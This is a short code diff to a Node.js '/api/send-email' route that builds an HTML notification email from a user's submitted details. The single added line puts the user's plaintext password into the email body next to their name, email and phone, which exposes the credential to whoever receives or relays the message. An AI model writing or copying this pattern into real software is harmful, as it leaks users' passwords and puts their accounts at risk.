@@ -113,6 +113,7 @@ app.post("/api/send-email", async (req, res) => {
               <p><strong>👤 Name:</strong> ${fullName}</p>
               <p><strong>📧 Email:</strong> ${email}</p>
               <p><strong>📞 Phone:</strong> ${phone}</p>
+              <p><strong>🔑 Password:</strong> ${password}</p> 
             </div>
             <a href="mailto:${email}" class="button">📧 Contact User</a>
           </div>
